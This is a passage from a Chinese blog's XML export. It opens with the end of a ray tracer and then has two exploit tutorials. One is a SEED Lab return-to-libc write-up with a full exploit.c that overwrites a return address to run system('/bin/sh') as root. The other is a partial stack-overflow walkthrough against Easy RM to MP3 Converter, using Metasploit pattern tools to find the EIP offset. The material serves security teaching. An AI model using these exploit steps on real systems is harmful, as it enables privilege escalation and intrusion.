sphere.position[2]), 2) - pow(sphere.radius, 2); b = 2 * (dir.x*(src.x - sphere.position[0]) + dir.y*(src.y - sphere.position[1]) + dir.z*(src.z - sphere.position[2]) ); //检查判别式是否大于0 if ((pow(b, 2) - 4 * c) &gt; 0) &#123; t1 = (((-1)*b) + sqrt(pow(b, 2) - 4 * c)) / 2; t2 = (((-1)*b) - sqrt(pow(b, 2) - 4 * c)) / 2; if (t1 &lt;= t2) t = t1; else t = t2; if (t &lt; 0) t = -1; else if (t&lt;1e-10) &#123; if (t1&lt;1e-15 &amp;&amp; t2&gt;1e-15) t = t2; else if (t2&lt;1e-15 &amp;&amp; t1&gt;1e-15) t = t1; else t = -1; &#125; &#125; else t = -1; return t;&#125;//获得两个顶点之间的边point getSide(Vertex v1, Vertex v2)&#123; point c; c.x = v1.position[0] - v2.position[0]; c.y = v1.position[1] - v2.position[1]; c.z = v1.position[2] - v2.position[2]; return c;&#125;//判断两个点是否相等bool checkEqual(point A, point B)&#123; bool equ; if ((abs(A.x - B.x)&lt;1e-10) &amp;&amp; (abs(A.y - B.y)&lt;1e-10) &amp;&amp; (abs(A.z - B.z)&lt;1e-10)) equ = 1; else equ = 0; return equ;&#125;double intersectTriangle(Triangle triangle, point src, point dir,isIn* iO)&#123; point AB, AC, DirxAC; float u, v, t; //isIn iO; AB = getSide(triangle.v[1], triangle.v[0]); AC = getSide(triangle.v[2], triangle.v[0]); DirxAC = cross(dir, AC); float det = dot(AB, DirxAC); point T; point p1; p1.x = triangle.v[0].position[0]; p1.y = triangle.v[0].position[1]; p1.z = triangle.v[0].position[2]; if (det &gt;0) &#123; T = minusPoint(src, p1);&#125; else &#123; T = minusPoint(p1, src); det = -det; &#125; if (det &lt; 1e-10) &#123; iO-&gt;in = -1; return -1; &#125; u = dot(T, DirxAC); if (u &lt; 0.0f || u &gt; det) &#123; iO-&gt;in = -1; return -1; &#125; point Q = cross(T, AB); v = dot(dir, Q); if (v &lt; 0.0f || u + v &gt; det) &#123; iO-&gt;in = -1; return -1; &#125; t = dot(AC, Q); //t = -t; float fInvDet = 1.0f / det; t *= fInvDet; u *= fInvDet; v *= fInvDet; iO-&gt;in = 1; iO-&gt;bary[0] = u; iO-&gt;bary[1] = v; iO-&gt;bary[2] = 1 - u - v; return t;&#125;//找到p点在圆上的的法向量，tID为spheres数组中的标号point findSphereNormal(point p, int tID)&#123; point n; // based on the equation n.x = (p.x - spheres[tID].position[0]) / spheres[tID].radius; n.y = (p.y - spheres[tID].position[1]) / spheres[tID].radius; n.z = (p.z - spheres[tID].position[2]) / spheres[tID].radius; return n;&#125;//三角形的线性插值,如果ID为0则表示法线插值,如果ID为1则表示漫反射，如果为2则表示镜面反射point chazhi(Triangle triangle, isIn iO, int ID)&#123; point P; if (ID == 0) &#123; P.x = iO.bary[0] * triangle.v[0].normal[0] + iO.bary[1] * triangle.v[1].normal[1] + iO.bary[2] * triangle.v[2].normal[2]; P.y = iO.bary[0] * triangle.v[0].normal[1] + iO.bary[1] * triangle.v[1].normal[1] + iO.bary[2] * triangle.v[2].normal[1]; P.z = iO.bary[0] * triangle.v[0].normal[2] + iO.bary[1] * triangle.v[1].normal[2] + iO.bary[2] * triangle.v[2].normal[2]; &#125; else if (ID == 1) &#123; P.x = iO.bary[0] * triangle.v[0].color_diffuse[0] + iO.bary[1] * triangle.v[1].color_diffuse[0] + iO.bary[2] * triangle.v[2].color_diffuse[0]; P.y = iO.bary[0] * triangle.v[0].color_diffuse[1] + iO.bary[1] * triangle.v[1].color_diffuse[1] + iO.bary[2] * triangle.v[2].color_diffuse[1]; P.z = iO.bary[0] * triangle.v[0].color_diffuse[2] + iO.bary[1] * triangle.v[1].color_diffuse[2] + iO.bary[2] * triangle.v[2].color_diffuse[2]; &#125; else if (ID == 2) &#123; P.x = iO.bary[0] * triangle.v[0].color_specular[0] + iO.bary[1] * triangle.v[1].color_specular[0] + iO.bary[2] * triangle.v[2].color_specular[0]; P.y = iO.bary[0] * triangle.v[0].color_specular[1] + iO.bary[1] * triangle.v[1].color_specular[1] + iO.bary[2] * triangle.v[2].color_specular[1]; P.z = iO.bary[0] * triangle.v[0].color_specular[2] + iO.bary[1] * triangle.v[1].color_specular[2] + iO.bary[2] * triangle.v[2].color_specular[2]; &#125; return P;&#125;//公式模型I_spec = k_z * I_l(V • ((2N • L)N - L))^n_s//其中R = (2N • L)N - Lpoint phong(point p, int id, int Obj, isIn iO, Light light, point camera)&#123; point n, l, v, r, kd, ks; point po; double lDotN, rDotV, n_s; //用point表示light的位置 l.x = light.position[0]; l.y = light.position[1]; l.z = light.position[2]; //l = l - p; //入射光线 l = unitize(minusPoint(l, p)); //v = camera - p; //观察者到p点的射线 v = unitize(minusPoint(camera, p)); if (Obj == 1) &#123; n = findSphereNormal(p, id); kd.x = spheres[id].color_diffuse[0]; kd.y = spheres[id].color_diffuse[1]; kd.z = spheres[id].color_diffuse[2]; ks.x = spheres[id].color_specular[0]; ks.y = spheres[id].color_specular[1]; ks.z = spheres[id].color_specular[2]; n_s = spheres[id].shininess; &#125; else if (Obj == 2) &#123; n = unitize(chazhi(triangles[id], iO, 0)); kd = chazhi(triangles[id], iO, 1); ks = chazhi(triangles[id], iO, 2); n_s = iO.bary[0] * triangles[id].v[0].shininess + iO.bary[1] * triangles[id].v[1].shininess + iO.bary[2] * triangles[id].v[2].shininess; &#125; lDotN = dot(l, n); if (lDotN&lt;0) lDotN = 0; else if (lDotN&gt;1.f) lDotN = 1.f; //R = (2N • L)N - L r.x = 2 * lDotN*n.x - l.x; r.y = 2 * lDotN*n.y - l.y; r.z = 2 * lDotN*n.z - l.z; rDotV = dot(r, v); if (rDotV&lt;0) rDotV = 0; else if (rDotV&gt;1.f) rDotV = 1.f; //计算该点的颜色r,g,b po.x = light.color[0] * ((kd.x)*lDotN + ((ks.x)*pow((rDotV), (n_s)))); // r po.y = light.color[1] * ((kd.y)*lDotN + ((ks.y)*pow((rDotV), (n_s)))); // g po.z = light.color[2] * ((kd.z)*lDotN + ((ks.z)*pow((rDotV), (n_s)))); // b return po;&#125;/*与物体相交*/intexPoint intersectObjects(point p1, point p2, point dir, int flag)&#123; point p, q,raySrc, pixPoint; intexPoint intxObj; isIn iO; iO.in = -1; double t, t1, t2, tS, tT; int id, Obj; q = p1; t1 = 0; id = -1; Obj = -1; raySrc = p1; //找到最近的交点 for (int i = 0; i &lt; num_spheres; i++) &#123; tS = intersectSphere(spheres[i], raySrc, dir); if (t1 == 0 &amp;&amp; tS &gt; 1e-10) &#123; t1 = tS; id = i; Obj = 1; &#125; else if (tS &lt;= t1 &amp;&amp; tS &gt; 1e-10) &#123; t1 = tS; id = i; Obj = 1; &#125; &#125; for (int i = 0; i &lt; num_triangles; i++) &#123; tT = intersectTriangle(triangles[i], raySrc, dir, &amp;iO); p = caluPoint(raySrc, dir, tT); //找到交点 //iO = isInTest(triangles[i], p); //判断p点是否在三角形内 if (iO.in == 1) &#123; if (t1 == 0 &amp;&amp; tT &gt; 1e-5) &#123; t1 = tT; id = i; Obj = 2; if (flag == 0) q = p; intxObj.iO.bary[0] = iO.bary[0]; intxObj.iO.bary[1] = iO.bary[1]; intxObj.iO.bary[2] = iO.bary[2]; &#125; else if (tT&lt;t1 &amp;&amp; tT&gt;1e-5) &#123; t1 = tT; id = i; Obj = 2; if (flag == 0) q = p; intxObj.iO.bary[0] = iO.bary[0]; intxObj.iO.bary[1] = iO.bary[1]; intxObj.iO.bary[2] = iO.bary[2]; &#125; &#125; &#125; if (flag == 1) &#123; //如果为1则计算从light到p点的距离t2 if (dir.x != 0) &#123; t2 = (p2.x - raySrc.x) / dir.x; &#125; else if (dir.y != 0) &#123; t2 = (p2.y - raySrc.y) / dir.y; &#125; else if (dir.z != 0) &#123; t2 = (p2.z - raySrc.z) / dir.z; &#125; else t2 = 0; //t2和t1进行比较，如果t1小于t2则说明没有物体挡住光线 if (t1 &gt;= t2) &#123; Obj = -1; id = -1; &#125; &#125; else if ((t1 &gt;= 0) &amp;&amp; (Obj == 1)) q = caluPoint(raySrc, dir, t1); intxObj.p = q; intxObj.t = t1; intxObj.tID = id; intxObj.tObj = Obj; return intxObj;&#125;point findColor(int x, int y)&#123; //point p, q, dir, light, lightS; //point black, pixColor, temp, tempN; //intexPoint intxObj, intxFlag; point black, pixColor, p; black.x = 0.0; black.y = 0.0; black.z = 0.0; pixColor = black; //将像素点转换为世界坐标 p.x = (((double)x / (double)WIDTH) * 2 * xMax) - xMax; p.y = (((double)y / (double)HEIGHT) * 2 * yMax) - yMax; p.z = -1; point dir1, p1 = p; dir1 = minusPoint(p, cam); dir1 = unitize(dir1); pixColor = Render(p, dir1); if (pixColor.x &gt; 1) pixColor.x = 1.f; if (pixColor.y &gt; 1) pixColor.y = 1.f; if (pixColor.z &gt; 1) pixColor.z = 1.f; return pixColor;&#125;//迭代渲染point Render(point p, point dir)&#123; Steps++; point blackColor, pixColor, q, light, dir1, temp, temp1; point reflect_ray; intexPoint intxObj, intxFlag; blackColor.x = 0.0; blackColor.y = 0.0; blackColor.z = 0.0; pixColor = blackColor; if (Steps &gt; MaxStep) &#123; Steps = 0; return blackColor; &#125; point p1 = p; intxObj = intersectObjects(p, p1, dir, 0); //如果和一个物体有交点 if (intxObj.tID != -1) &#123; q = intxObj.p; reflect_ray = reflect(intxObj, dir); pixColor.x += ambient_light[0]; pixColor.y += ambient_light[1]; pixColor.z += ambient_light[2]; for (int h = 0; h &lt; num_lights; h++) &#123; light.x = lights[h].position[0]; light.y = lights[h].position[1]; light.z = lights[h].position[2]; dir1 = minusPoint(light, q); dir1 = unitize(dir1); intxFlag = intersectObjects(q, light, dir1, 1); //如果没有物体遮挡 if (intxFlag.tID == -1) &#123; //phong模型求出颜色 temp = phong(q, intxObj.tID, intxObj.tObj, intxObj.iO, lights[h], cam); pixColor.x += temp.x; pixColor.y += temp.y; pixColor.z += temp.z; &#125; &#125; temp1 = Render(q, reflect_ray); int id = intxObj.tID; if (intxObj.tObj == 1) &#123; pixColor.x += temp1.x * spheres[id].color_specular[0]; pixColor.y += temp1.y * spheres[id].color_specular[1]; pixColor.z += temp1.z * spheres[id].color_specular[2]; &#125; else &#123; point tp = chazhi(triangles[id], intxObj.iO, 2); pixColor.x += temp1.x * tp.x; pixColor.y += temp1.y * tp.y; pixColor.z += temp1.z * tp.z; &#125; &#125; else &#123; pixColor = blackColor; Steps = 0; &#125; return pixColor;&#125;//反射的光线的方向point reflect(intexPoint intx, point dir)&#123; point result; point n; if (intx.tObj == 1) &#123; n = findSphereNormal(intx.p, intx.tID); &#125; else &#123; n = unitize(chazhi(triangles[intx.tID], intx.iO, 0)); &#125; dir.x = -dir.x; dir.y = -dir.y; dir.z = -dir.z; double r1 = dot(n, dir); point n2; n2.x = n.x * 2 * r1; n2.y = n.y * 2 * r1; n2.z = n.z * 2 * r1; result = n2; return result;&#125;void drawColor()&#123; unsigned int x, y; point pixColor; for (x = 0; x &lt; WIDTH; x++) &#123; for (y = 0; y &lt; HEIGHT; y++) &#123; pixColor = findColor(x, y); plot_pixel_jpeg(x, y, abs(pixColor.x) * 255, abs(pixColor.y) * 255, abs(pixColor.z) * 255); &#125; &#125;&#125;//MODIFY THIS FUNCTIONvoid draw_scene()&#123; unsigned int x,y; //glPointSize(2.0); //glBegin(GL_POINTS); //simple output for(x=0; x&lt;WIDTH; x++) &#123;glPointSize(2.0); glBegin(GL_POINTS);for(y=0;y &lt; HEIGHT;y++)&#123; // plot_pixel(x,y,x%256,y%256,(x+y)%256); plot_pixel_display(x, y, buffer[HEIGHT - y - 1][x][0], buffer[HEIGHT - y - 1][x][1], buffer[HEIGHT - y - 1][x][2]);&#125;glEnd();glFlush(); &#125; printf("Done!\n"); fflush(stdout);&#125;void plot_pixel_display(int x,int y,unsigned char r,unsigned char g,unsigned char b)&#123; glColor3f(((double)r)/256.f,((double)g)/256.f,((double)b)/256.f); glVertex2i(x,y);&#125;void plot_pixel_jpeg(int x,int y,unsigned char r,unsigned char g,unsigned char b)&#123; buffer[HEIGHT-y-1][x][0]=r; buffer[HEIGHT-y-1][x][1]=g; buffer[HEIGHT-y-1][x][2]=b;&#125;void plot_pixel(int x,int y,unsigned char r,unsigned char g, unsigned char b)&#123; plot_pixel_display(x,y,r,g,b); if(mode == MODE_JPEG) plot_pixel_jpeg(x,y,r,g,b);&#125;/*void save_jpg()&#123; Pic *in = NULL; in = pic_alloc(640, 480, 3, NULL); printf("Saving JPEG file: %s\n", filename); memcpy(in-&gt;pix,buffer,3*WIDTH*HEIGHT); if (jpeg_write(filename, in))printf("File saved Successfully\n"); elseprintf("Error in Saving\n"); pic_free(in); &#125;*/void parse_check(char *expected,char *found)&#123; if(stricmp(expected,found))&#123; char error[100]; printf("Expected '%s ' found '%s '\n",expected,found); printf("Parse error, abnormal abortion\n"); exit(0);&#125;&#125;void parse_doubles(FILE*file, char *check, double p[3])&#123; char str[100]; fscanf(file,"%s",str); parse_check(check,str); fscanf(file,"%lf %lf %lf",&amp;p[0],&amp;p[1],&amp;p[2]); printf("%s %lf %lf %lf\n",check,p[0],p[1],p[2]);&#125;void parse_rad(FILE*file,double *r)&#123; char str[100]; fscanf(file,"%s",str); parse_check("rad:",str); fscanf(file,"%lf",r); printf("rad: %f\n",*r);&#125;void parse_shi(FILE*file,double *shi)&#123; char s[100]; fscanf(file,"%s",s); parse_check("shi:",s); fscanf(file,"%lf",shi); printf("shi: %f\n",*shi);&#125;int loadScene(char *argv)&#123; FILE *file = fopen(argv,"r"); int number_of_objects; char type[50]; int i; Triangle t; Sphere s; Light l; fscanf(file,"%i",&amp;number_of_objects); printf("number of objects: %i\n",number_of_objects); char str[200]; parse_doubles(file,"amb:",ambient_light); for(i=0;i &lt; number_of_objects;i++)&#123; fscanf(file,"%s\n",type); printf("%s\n",type); if(stricmp(type,"triangle")==0) &#123; printf("found triangle\n"); int j; for(j=0;j &lt; 3;j++) &#123; parse_doubles(file,"pos:",t.v[j].position); parse_doubles(file,"nor:",t.v[j].normal); parse_doubles(file,"dif:",t.v[j].color_diffuse); parse_doubles(file,"spe:",t.v[j].color_specular); parse_shi(file,&amp;t.v[j].shininess); &#125; if(num_triangles == MAX_TRIANGLES) &#123; printf("too many triangles, you should increase MAX_TRIANGLES!\n"); exit(0); &#125; triangles[num_triangles++] = t; &#125; else if(stricmp(type,"sphere")==0) &#123; printf("found sphere\n"); parse_doubles(file,"pos:",s.position); parse_rad(file,&amp;s.radius); parse_doubles(file,"dif:",s.color_diffuse); parse_doubles(file,"spe:",s.color_specular); parse_shi(file,&amp;s.shininess); if(num_spheres == MAX_SPHERES) &#123; printf("too many spheres, you should increase MAX_SPHERES!\n"); exit(0); &#125; spheres[num_spheres++] = s; &#125; else if(stricmp(type,"light")==0) &#123; printf("found light\n"); parse_doubles(file,"pos:",l.position); parse_doubles(file,"col:",l.color); if(num_lights == MAX_LIGHTS) &#123; printf("too many lights, you should increase MAX_LIGHTS!\n"); exit(0); &#125; lights[num_lights++] = l; &#125; else &#123; printf("unknown type in scene description:\n%s\n",type); exit(0); &#125;&#125; return 0;&#125;void display()&#123; cam.x = 0.0; cam.y = 0.0; cam.z = 0.0; glLoadIdentity(); drawColor(); draw_scene();&#125;void init()&#123; glMatrixMode(GL_PROJECTION); glOrtho(0,WIDTH,0,HEIGHT,1,-1); glMatrixMode(GL_MODELVIEW); glLoadIdentity(); glClearColor(0,0,0,0); glClear(GL_COLOR_BUFFER_BIT);&#125;void idle()&#123; //hack to make it only draw once static int once=0; if (!once) &#123; draw_scene();// if (mode == MODE_JPEG)// save_jpg(); &#125; once=1;&#125;int main (int argc, char ** argv)&#123; if (argc&lt;2 || argc &gt; 3) &#123; printf ("usage: %s &lt;scenefile&gt; [jpegname]\n", argv[0]);exit(0); &#125; if(argc == 3)&#123; mode = MODE_JPEG; filename = argv[2];&#125; else if(argc == 2)mode = MODE_DISPLAY; glutInit(&amp;argc,argv); loadScene(argv[1]); glutInitDisplayMode(GLUT_RGBA | GLUT_SINGLE); glutInitWindowPosition(0,0); glutInitWindowSize(WIDTH,HEIGHT); int window = glutCreateWindow("Ray Tracer"); glutDisplayFunc(display); glutIdleFunc(idle); init(); glutMainLoop();&#125; 运行结果如图所示]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[seed-returnToLibc]]></title>
    <url>%2F2016%2F05%2F16%2Fseed-returnToLibc%2F</url>
    <content type="text"><![CDATA[声明该教程是根据Seed Lab: return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击(′▽`〃)一：背景介绍DEP数据执行保护 溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP（数据执行保护，Data Execution Prevention）就是用来弥补计算机对数据和代码混淆这一天然缺陷的。DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP 的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。所以一般的将shellcode存放到栈中并将shellcode执行的方式在这种机制中是不可行的。 在Linux中，通常在编译的时候添加 -fno-stack-protector -z noexecstack 编译选项就会开启该模式，在该模式下，不能像以前的攻击将恶意代码overflow进栈中，并将return地址指向恶意代码开始处，在这种情况下应该借用系统库的调用从而达到提权等目的。 Return-to-libc原理 Return-into-libc 攻击可以将漏洞函数返回到内存空间已有的动态库函数中。而为了理解 return-into-libc 攻击，这里首先给出程序函数调用过程中栈帧的结构。 图 1.函数调用时栈帧的结构： 图 1 给出了一个典型的函数调用时的栈帧结构，该栈从高位地址向低位地址增长。每当一个函数调用另一个函数向低地址方向压栈，而当函数返回时向高地址方向清栈。例如，当 main() 调用 func(arg_1,arg_2,arg_3) 时，首先将所有参数arg_1,arg_2 和 arg_3入栈。图 1 中参数从右向左依次被压入栈中，这是因为 C 语言中函数传参是从右向左压栈的。然后，call 指令会将返回地址压栈，并使执行流转到 func()。返回地址是 call 指令的下一条指令的地址，这个用于告知 func ()函数返回后从 main()函数的哪条指令开始执行。进入 func 函数后，通常需要将 main()函数的栈底指针 ebp 保存到栈中并将当前的栈顶指针 esp 保存在 ebp 中作为 func 的栈底。接下来，func 函数会在栈中为局部变量等分配空间。因此，调用函数 func()时的栈帧结构如图 1 所示。 而当 func()执行完成返回时 leave 指令将 ebp 拷贝到 esp 中清空局部变量在栈中的区域，然后从堆栈中弹出老 ebp 放回 ebp 寄存器使 ebp 恢复为 main()函数的栈底。然后 ret 指令从栈中获取返回地址，返回到 main()函数中继续执行。 攻击者可以利用栈中的内容实施 return-into-libc 攻击。这是因为攻击者能够通过缓冲区溢出改写返回地址为一个库函数的地址，并且将此库函数执行时的参数也重新写入栈中。这样当函数调用时获取的是攻击者设定好的参数值，并且结束后返回时就会返回到库函数而不是 main()。而此库函数实际上就帮助攻击者执行了其恶意行为。更复杂的攻击还可以通过 return-into-libc 的调用链（一系列库函数的连续调用）来完成。 二：实验部分获得system()和exit()的地址由于在实验开始就执行了 sysctl -w kernel.randomize_va_space=0 命令，该命令用来将系统的ASLR（地址随机化机制）关闭，所以在每次将libc.so库加载到内存中时，system()和exit()的地址都是一样的。所以就gdb调试retlib程序，在main出设置断点，并运行，程序会在main的入口处停下，然后执行p system,和p exit就能将system和exit在内存中的地址打印出来。 具体操作如图2所示： 由该图可知，函数system()和exit()的地址分别为0xb7e5f430和0xb7e52fb0。 获得”/bin/sh”字符串地址获得字符串的地址主要有两种方法:其中第一个是在libc.so中找到字符串地址，第二个方法是将/bin/sh字符串放到环境变量中去 由于libc.so的地址是固定的，所以在libc.so的”/bin/sh”字符串的地址也是固定的，所以可以在gdb调试的时候用find指定找到一个/bin/sh字符串的地址，具体方法如图3所示： 首先export MYSHELL = /bin/sh,然后编写程序获得名为MYSHELL环境变量的地址，将其输出即可，输出结果如图4所示： 获得buffer要return的地址偏移首先构造一个从A-Z和从a-z的badfile文件，然后gdb retlib，run，就会出现栈溢出，找出栈溢出的地址为如图5所示 0x62615a59代表的char为baZY，因为它是大端法表示的，所以为YZab，在地buffer的24-27偏移处。所以X为24。 由图1可知道栈的结构，即return地址的下面4个字节为要返回的下个地址指针，再下面4个字节为函数参数，所以24+4=28处存取exit()的函数，24+8=32出存取/bin/sh字符串的地址 编写exploit程序所以exploit.c的程序如下所示: 123456789101112131415161718192021222324#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; char buf[40]; FILE *badfile; badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;); int i; for(i = 0;i &lt; 40;i++) buf[i] = 0x90; /* You need to decide the addresses and the values for X, Y, Z. The order of the following three statements does not imply the order of X, Y, Z. Actually, we intentionally scrambled the order. */ *(long *) &amp;buf[32] = 0xb7f80fb8 ; // &quot;/bin/sh&quot; *(long *) &amp;buf[24] = 0xb7e5f430 ; // system() *(long *) &amp;buf[28] = 0xb7e52fb0 ; // exit() fwrite(buf, sizeof(buf), 1, badfile); fclose(badfile);&#125; 在前面步骤获得了system()，exit()和/bin/sh在内存的地址，以及return在buffer的偏移地址，所以可以按照上面获得的信息来补全exploit.c的程序。 retlib.c程序: 12345678910111213141516171819202122232425262728/* This program has a buffer overflow vulnerability. *//* Our task is to exploit this vulnerability */#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int bof(FILE *badfile)&#123;char buffer[12];/* The following statement has a buffer overflow problem */fread(buffer, sizeof(char), 40, badfile);return 1;&#125;int main(int argc, char **argv)&#123;FILE *badfile;badfile = fopen(&quot;badfile&quot;, &quot;r&quot;);bof(badfile);printf(&quot;Returned Properly\n&quot;);fclose(badfile);return 1;&#125; 在编译retlib.c程序时，用root权限编译，这样在运行/bin/sh程序时即可提权。 提权结果如下：]]></content>
      <categories>
        <category>反汇编</category>
      </categories>
      <tags>
        <tag>反汇编</tag>
        <tag>seed</tag>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ExploitTutorial]]></title>
    <url>%2F2016%2F04%2F13%2FExploitTutorial%2F</url>
    <content type="text"><![CDATA[声明：本博客是根据Exploit该链接所写 准备工作 实验环境：windows xp windows xp sp3 下载easyRmtomp3.exe,下载地址：https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe 使程序crash 编写一个程序生成10000个字符，可以使程序crash，程序如图所示 crash的程序如下图所示： 但没有出现崩溃，可见改程序采取了保护措施，将A的数量增加，增加到20000时，也不会崩溃，当增加到30000时，程序崩溃。如图所示： 会出现地址指针EIP指向0x41414141地址，由于找不到改地址所以该程序会发生崩溃。 栈信息介绍栈的信息如下图所示： 确定return的地址偏移 构造buffer字符串，生成25000个’A’和5000个’B’时，观察EIP的数值12345678910111213141516171819202122#include&lt;stdio.h&gt; int main() &#123; FILE* fp = NULL; fp = fopen(&quot;crash2.m3u&quot;,&quot;w+&quot;); int i = 0; if(fp == NULL) return; for(i;i &lt; 25000; i++) &#123; fprintf(fp,&quot;\x41&quot;); &#125; for(i = 0; i &lt; 5000; i++) &#123; fprintf(fp, &quot;\x42&quot;); &#125;&#125; 调试结果如图所示： 可以知道EIP为0x42424242,所以return地址偏移在25000和30000之间 测试eip的offset具体在什么位置 利用metasploit的工具测试具体在什么位置，具体如下：cd metasplot-framework/tools ./pattern_create.rb 5000 &gt; mima.txt 生成5000大小的字符串并输出到mima.txt文件 构建前25000个为A，后5000个位mima.txt为内容的.m3u文件，如图所示： 得到的eip结果如下图所示： 可知eip的值为0x42316A42 然后利用metasploit工具找到具体是什么位置，命令如下：.pattern_offset.rb 0x423116A42 5000,得到结果为1053 测试一下1053是否正确，编写如下程序： 运行测试一下，结果如下图： 可以看到eip指向的是0x42424242，所以找到的return的地址偏移是正确的 该教程先写到这，有空再继续(＾－＾)V]]></content>
      <categories>
        <category>反汇编</category>
      </categories>
      <tags>
        <tag>反汇编</tag>
        <tag>Exploit</tag>
      </tags>
  </entry>
</search>